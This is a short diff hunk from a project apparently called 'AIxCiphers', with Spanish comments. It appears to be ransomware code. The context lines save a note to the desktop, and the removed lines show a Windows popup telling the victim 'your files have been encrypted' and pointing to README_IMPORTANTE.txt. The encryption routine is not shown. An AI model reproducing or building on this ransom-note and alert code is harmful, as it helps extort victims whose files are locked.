@@ -57,9 +57,6 @@ AIxCiphers
     # Guardar la nota en un archivo de texto en el escritorio
     with open(note_path, "w") as archivo:
         archivo.write(note)
-    # Mostrar un mensaje emergente usando MessageBox de Windows
-    ctypes.windll.user32.MessageBoxW(0, "¡Tus archivos han sido cifrados! Lee el archivo README_IMPORTANTE.txt en tu escritorio.", 
-                                     "ALERTA DE SEGURIDAD", 0x10 | 0x1)
 
 
 
